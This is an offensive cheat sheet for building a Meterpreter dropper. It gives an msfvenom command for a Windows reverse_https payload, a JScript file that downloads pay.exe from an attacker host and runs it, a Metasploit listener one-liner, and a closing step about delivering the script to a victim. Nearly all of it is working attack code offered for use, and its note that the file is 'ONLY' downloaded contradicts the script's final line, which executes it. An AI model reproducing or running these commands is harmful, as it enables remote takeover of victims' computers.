# Meterpreter Dropper

## Important This will ONLY download the file to the victim, we still need to find another way to execute it.

### 1) Craft payload

    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=[PORT] EXITFUNC=thread -f exe -o pay.exe

### 2) Create the .js file

    var url = "http://[ATTACKER_IP]/pay.exe"
    var Object = WScript.CreateObject('MSXML2.XMLHTTP');
    
    Object.Open('GET', url, false);
    Object.Send();
    
    if (Object.Status == 200)
    {
        var Stream = WScript.CreateObject('ADODB.Stream');
    
        Stream.Open();
        Stream.Type = 1;
        Stream.Write(Object.ResponseBody);
        Stream.Position = 0;
    
        Stream.SaveToFile("pay.exe", 2);
        Stream.Close();
    }
    
    var r = new ActiveXObject("WScript.Shell").Run("pay.exe");

### 3) Start listener

    sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit"

### 4) Find a way to deliver this script to the user, keep in mind that this one will only download it, we still need to find a way for the system to execute the .exe
